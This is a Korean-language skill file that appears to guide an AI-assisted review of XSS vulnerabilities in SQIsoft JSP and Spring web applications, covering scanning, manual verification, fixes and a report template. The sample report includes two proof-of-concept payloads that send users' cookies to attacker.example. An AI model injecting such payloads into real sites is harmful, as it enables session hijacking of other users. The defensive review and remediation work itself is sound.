---
name: detecting-xss-vulnerabilities
description: >-
  SQIsoft 웹 애플리케이션에서 XSS(Cross-Site Scripting) 취약점을 검사한다.
  사용자 입력이 HTML/JavaScript 컨텍스트에 이스케이프 없이 출력되는 반사형·저장형·DOM 기반
  XSS를 탐지한다. 프로젝트 스택(Spring Boot 모던 / JSP·Servlet 레거시)을 자동 감지하여
  스택별 Semgrep 룰로 1차 탐지하고, AI가 이스케이프 유무와 출력 컨텍스트를 검증한다.
  JSP scriptlet <%=…%>·미이스케이프 EL 표현식·escapeXml="false"·JS 인라인 출력(게시판
  저장형 핵심), Spring @ResponseBody HTML 반환·Thymeleaf th:utext·React
  dangerouslySetInnerHTML·DOM innerHTML 할당(DOM XSS) 등을 찾는다.
domain: cybersecurity
subdomain: web-application-security
tags: [xss, cross-site-scripting, cwe-79, owasp-a03, jsp, spring, thymeleaf, react, mybatis, sqisoft]
cwe: [CWE-79]
owasp: [A03:2021-Injection]
stacks: [spring-modern, jsp-legacy]
version: "0.3.0"
author: sqisoft-security
license: Proprietary
---

# XSS 취약점 검사 (Cross-Site Scripting)

## When to Use

다음 중 하나라도 해당하면 이 스킬을 실행한다.

- SQIsoft 프로젝트(`sqisoft-sef-2026`, `Gseed_Web_Renew`)의 **사용자 입력을 화면에 출력하는 기능**(게시판 제목·본문·댓글, 검색어 결과 표시, 관리자 입력값 확인 화면)을 점검할 때
- 게시판·공지사항·자유게시판 등 **저장형(Stored) XSS** 가능 지점을 확인할 때
- JSP `<%= %>` 또는 `${param.x}` 미이스케이프 출력, `<c:out escapeXml="false">` 의심 시
- Thymeleaf `th:utext`, React `dangerouslySetInnerHTML`, `element.innerHTML = userInput` 의심 시
- 보안 코드 리뷰·출시 전 점검에서 XSS 방어 적용 여부를 확인할 때

**이 스킬을 쓰지 않을 때:** CSRF·SQLi 등 다른 취약점 클래스(→ 해당 스킬 사용). 완전히 서버 내부에서만 소비되는 데이터로 브라우저 출력이 전혀 없는 API.

## Prerequisites

- 대상 프로젝트 소스에 대한 읽기 접근
- (선택, 권장) `semgrep` 설치 — 없으면 `scripts/scan_xss.py`가 grep 폴백으로 동작
- 스택 판별 참고: `references/stack-patterns.md`

## Workflow

### 0단계 — 스택 자동 감지

대상 경로의 루트 신호를 확인해 스택을 판별한다. 한 리포에 둘이 섞이면 디렉토리별로 나눠 판별한다.

| 스택 | 감지 신호 | 적용 룰 |
|---|---|---|
| `spring-modern` | `build.gradle.kts`/`settings.gradle*`, `src/main/java/**`, `@Controller`/`@RestController` | `rules/xss.yml`의 spring 룰 |
| `jsp-legacy` | `**/WEB-INF/web.xml`, `*.jsp`, `pom.xml`, `src/main/webapp/**` | `rules/xss.yml`의 jsp 룰 |

```bash
# 스택 신호 빠른 확인
ls "$TARGET"/build.gradle.kts "$TARGET"/settings.gradle.kts 2>/dev/null   # → spring-modern
find "$TARGET" -name web.xml -path '*WEB-INF*' -o -name '*.jsp' | head    # → jsp-legacy
```

### 1단계 — 스캐너 1차 탐지 (재현 가능)

```bash
python skills/detecting-xss-vulnerabilities/scripts/scan_xss.py "$TARGET" --json
```

스크립트는 스택을 감지해 알맞은 Semgrep 룰을 돌리고, Semgrep이 없으면 grep 폴백으로 후보를 잡는다. 출력은 `{file, line, rule_id, stack, snippet}` 목록.

### 2단계 — AI 컨텍스트 검증 (핵심)

스캐너 후보는 **출발점일 뿐**이다. 각 후보를 다음 기준으로 직접 검증한다.

**jsp-legacy 검증 포인트**

1. `<%= request.getParameter("x") %>` — scriptlet 직접 출력은 이스케이프가 전혀 없으면 **반사형 XSS 확정**. `fn:escapeXml()` 혹은 `<c:out>` 래핑 여부 확인.
2. `${param.x}` — EL 표현식 자체는 EL 인젝션이 아니라 HTML 출력 여부가 핵심. JSP EL은 기본 이스케이프가 **없음**(`<c:out value="${param.x}">` 형태라야 안전).
3. `<c:out value="..." escapeXml="false">` — `escapeXml="false"` 명시 시 이스케이프 비활성 → 위험.
4. JS 블록 내 EL: `var x = "${param.x}";` — HTML 이스케이프가 JS 컨텍스트에서는 불충분. `<` 등 JS 이스케이프 필요.
5. 게시판 본문(DB 저장값) 출력: `${board.content}` — 저장 시 필터링 유무와 출력 시 이스케이프 유무를 **같이** 확인. 저장 필터 없이 출력 이스케이프도 없으면 저장형 XSS.
6. `fn:escapeXml()` 래핑 — **안전**. 오탐으로 처리.

**spring-modern 검증 포인트**

1. `@ResponseBody`/`@RestController`가 `String` HTML 반환 — `Content-Type: text/html`로 반환하면서 사용자 입력이 문자열에 포함되면 반사형 XSS.
2. Thymeleaf `th:utext` — Unescaped text. 사용자 데이터가 바인딩되면 위험. `th:text`는 안전.
3. React/JS 프론트: `dangerouslySetInnerHTML={{ __html: userInput }}` — 사용자 제어 값이 들어오면 DOM XSS.
4. `element.innerHTML = value` — 백엔드 API 응답의 사용자 데이터를 innerHTML에 할당 시 DOM XSS.
5. `document.write(location.search)` / `eval(userInput)` — URL 파라미터를 DOM에 직접 쓰는 패턴.
6. 텍스트 노드 조작(`textContent`, `innerText`) — **안전**. 오탐으로 처리.

**공통 — 누락 보강 (스캐너가 못 잡는 것)**

- 서버→클라이언트 JSON API 응답 내 HTML 특수문자 미인코딩(헤더가 `application/json`이어도 `<script>` 삽입 가능한 경우)
- Content-Security-Policy(CSP) 헤더 설정 여부 — 없으면 XSS 피해 폭 확대. Low로 보조 기록.
- 관리자 페이지 입력 → 일반 사용자 화면 출력 경로(저장형 XSS의 피해 범위 증폭)

### 3단계 — 사업부 표준 리포트

확정된 항목만 아래 양식으로 출력한다. 스캐너 후보 중 검증에서 탈락한 것은 "오탐 제외"에 간단히 남긴다.

## Output Format

```markdown
# XSS 취약점 점검 리포트
- 대상: <프로젝트/경로>   | 감지 스택: <spring-modern | jsp-legacy | mixed>
- 스캐너: <semgrep vX.Y | grep-fallback>   | 점검일: <YYYY-MM-DD>

## 요약
- 확정 취약: N건 (High n / Medium n / Low n)
- 의도된 예외: M건   | 오탐 제외: K건

## 확정 취약점

### [High] 저장형 XSS — 게시판 본문 미이스케이프 출력 — boardDetailPage.jsp:99
- 스택 / 위치: jsp-legacy / boardDetailPage.jsp:99
- **① 취약한 점(What)**: `${board.bbsContent}`를 이스케이프 없이 HTML에 직접 출력. DB에 저장된 본문에 `<script>` 태그가 포함되면 그대로 실행됨.
- **② 취약한 이유(Why)**: JSP EL 표현식 `${...}`는 HTML 자동 이스케이프를 수행하지 않는다. 게시글 저장 시 입력 필터링도 없으면 공격자가 작성한 스크립트가 조회하는 모든 사용자에게 실행된다(저장형 XSS).
- **③ 뚫리는 방법(How · 개념 PoC)**: 공격자가 게시글 본문에 아래를 입력하고 저장:
  ```html
  <script>document.location='https://attacker.example/steal?c='+document.cookie</script>
  ```
  다른 사용자가 해당 게시글을 열면 세션 쿠키가 공격자 서버로 전송됨 (세션 탈취).
  관리자가 조회 시 관리자 권한으로 악성 동작 수행 가능(권한 상승).
- **④ 해결방법(Fix)**: 출력 시 반드시 이스케이프. `fn:escapeXml()` 또는 `<c:out>` 사용:
  ```jsp
  <%-- Before (취약) --%>
  <p class="content__text">${board.bbsContent}</p>

  <%-- After (안전) --%>
  <p class="content__text"><c:out value="${board.bbsContent}"/></p>
  <%-- 또는: ${fn:escapeXml(board.bbsContent)} --%>
  ```
  HTML 에디터(리치 텍스트) 허용 시 서버 측 HTML Sanitizer(예: OWASP AntiSamy, jsoup allowlist) 적용.
- 참조: CWE-79, OWASP A03:2021

### [Medium] DOM XSS — innerHTML에 API 응답 할당 — board.js:47
- 스택 / 위치: spring-modern / board.js:47
- **① 취약한 점(What)**: `element.innerHTML = data.title` 형태로 서버 API 응답의 사용자 데이터를 DOM에 직접 삽입.
- **② 취약한 이유(Why)**: `innerHTML`은 HTML 파서를 거치므로 `<img onerror=...>`, `<svg onload=...>` 등 이벤트 핸들러가 실행된다. API 응답이 다른 사용자의 입력을 포함하면 저장형 DOM XSS.
- **③ 뚫리는 방법(How · 개념 PoC)**:
  ```html
  <!-- 공격자가 제목 필드에 저장 -->
  <img src=x onerror="fetch('https://attacker.example/exfil?d='+document.cookie)">
  ```
- **④ 해결방법(Fix)**:
  ```js
  // Before (취약)
  element.innerHTML = data.title;

  // After (안전) — 텍스트 노드로 삽입
  element.textContent = data.title;
  // 또는 DOM API 활용
  const node = document.createTextNode(data.title);
  element.appendChild(node);
  ```
- 참조: CWE-79, OWASP A03:2021

## 의도된 예외 (확인 필요)
- [Info] 관리자 전용 HTML 에디터 — 입력자가 신뢰된 관리자이고 AntiSamy 허용 목록 필터 적용 확인 필요

## 오탐 제외
- boardDetailPage.jsp:85 `${fn:escapeXml(item.bbsTitle)}` — fn:escapeXml 래핑으로 안전
- boardDetailPage.jsp:95 `${fn:escapeXml(bbsCnt)}` — fn:escapeXml 래핑으로 안전
```

## Verification (검사 자체의 신뢰성 확인)

- [ ] 스택 감지 결과가 실제 프로젝트와 일치하는가(섞인 경우 디렉토리별로 처리했는가)
- [ ] 모든 `${...}` EL 출력, `<%= %>` scriptlet, `th:utext`, `innerHTML` 할당을 빠짐없이 훑었는가
- [ ] 각 후보에서 `fn:escapeXml()`·`<c:out>`·`th:text`·`textContent` 등 안전 패턴 래핑 여부를 코드로 확인했는가(추측 금지)
- [ ] 게시판 저장 시 입력 필터링(AntiSamy 등) 유무를 서비스 레이어에서 확인했는가
- [ ] 각 확정 취약점에 재현 근거(파일:라인 + 출력 컨텍스트)가 붙어 있는가
- [ ] CSP 헤더 설정 여부를 보조 방어로 함께 기록했는가

## Key Concepts

| 용어 | 설명 |
|---|---|
| 반사형 XSS | URL 파라미터 등 요청 값이 즉시 응답에 출력되어 실행 |
| 저장형 XSS | 악성 스크립트가 DB에 저장되어 다른 사용자 조회 시 실행 — 피해 범위 넓음 |
| DOM XSS | 서버 응답이 아닌 클라이언트 JS가 DOM을 조작할 때 발생 |
| `<c:out>` | JSTL 태그. 기본 `escapeXml="true"` — JSP 안전 출력 표준 방법 |
| `fn:escapeXml()` | JSTL 함수. EL 표현식 안에서 HTML 특수문자 이스케이프 |
| `th:text` vs `th:utext` | Thymeleaf: `th:text`는 이스케이프(안전), `th:utext`는 비이스케이프(위험) |
| `textContent` | JS DOM 속성. HTML 파서 미사용 — innerHTML 대신 사용 |
| CSP | Content-Security-Policy 헤더. 인라인 스크립트 차단 보조 방어 |
| AntiSamy / jsoup | 서버 측 HTML Sanitizer — 리치 텍스트 에디터 허용 시 필수 |

## Tools & Systems

- Semgrep (룰: `rules/xss.yml`) · grep 폴백
- JSTL `<c:out>`, `fn:escapeXml`, Thymeleaf `th:text`
- OWASP AntiSamy, jsoup Safelist (리치 텍스트 정화)
- Content-Security-Policy (CSP) 헤더
- 참고: `references/stack-patterns.md`
